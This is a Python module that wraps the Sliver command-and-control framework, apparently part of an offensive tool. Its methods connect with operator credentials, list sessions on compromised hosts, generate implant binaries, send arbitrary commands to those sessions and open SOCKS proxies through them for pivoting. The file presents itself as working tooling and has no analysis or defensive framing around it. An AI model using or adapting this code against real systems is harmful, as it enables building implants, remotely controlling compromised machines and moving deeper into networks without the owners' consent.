import os
import time
from typing import Optional

from .models import C2Session, ImplantConfig, TaskResult, SessionStatus


class SliverBackend:
    def __init__(self, config_path: str = ""):
        self._name = "sliver"
        self._config_path = config_path or os.getenv("SLIVER_OPERATOR_CONFIG", "")
        self._client = None
        self._available = False

    @property
    def available(self) -> bool:
        return self._available

    async def _ensure_client(self):
        if self._client is not None:
            return
        try:
            from sliver import SliverClient
            if self._config_path and os.path.exists(self._config_path):
                cfg = open(self._config_path).read()
            else:
                cfg = os.getenv("SLIVER_OPERATOR_CONFIG_B64", "")
            self._client = await SliverClient.from_config(cfg)
            await self._client._connect()
            self._available = True
        except Exception:
            self._client = None
            self._available = False

    async def list_sessions(self) -> list[C2Session]:
        await self._ensure_client()
        if not self._available:
            return []
        try:
            sessions = await self._client.sessions()
            return [
                C2Session(
                    id=s.ID,
                    hostname=s.Hostname,
                    address=s.RemoteAddress,
                    os=s.OS,
                    arch=s.Arch,
                    transport=s.Transport,
                    status=SessionStatus.ALIVE,
                    last_checkin=time.time(),
                )
                for s in sessions
                if not s.IsDead
            ]
        except Exception:
            self._available = False
            return []

    async def generate_implant(self, config: ImplantConfig) -> bytes:
        await self._ensure_client()
        if not self._available:
            return b""
        try:
          from sliver.sliver_pb2 import GenerateReq, ImplantConfig as SliverImplantConfig
          req = GenerateReq(
              Config=SliverImplantConfig(
                  IsSharedLib=False,
                  IsService=False,
                  OS=config.os,
                  Arch=config.arch,
                  Format=config.format,
                  Name=config.name,
                  LimitDomain=config.limit_domain or "",
                  LimitHostname=config.limit_hostname or "",
              )
          )
          resp = await self._client._stub.Generate(req)
          return resp.File
        except Exception:
            return b""

    async def send_task(self, session_id: str, command: str) -> TaskResult:
        await self._ensure_client()
        if not self._available:
            return TaskResult(session_id=session_id, task_id="", output="", error="No C2 backend", completed=False)
        try:
            t0 = time.time()
            task = await self._client.execute(session_id, command, timeout=60)
            output = task.get_output() or ""
            return TaskResult(
                session_id=session_id,
                task_id=task.ID,
                output=output[:50000],
                duration=time.time() - t0,
            )
        except Exception as e:
            return TaskResult(session_id=session_id, task_id="", output="", error=str(e), completed=False)

    async def socks_start(self, session_id: str, port: int = 1081) -> Optional[str]:
        await self._ensure_client()
        if not self._available:
            return None
        try:
            await self._client.socks_start(session_id, port)
            return f"socks5h://127.0.0.1:{port}"
        except Exception:
            return None

    async def socks_stop(self, session_id: str):
        await self._ensure_client()
        if not self._available:
            return
        try:
            await self._client.socks_stop(session_id)
        except Exception:
            pass

    async def stop(self):
        if self._client:
            try:
                await self._client.disconnect()
            except Exception:
                pass
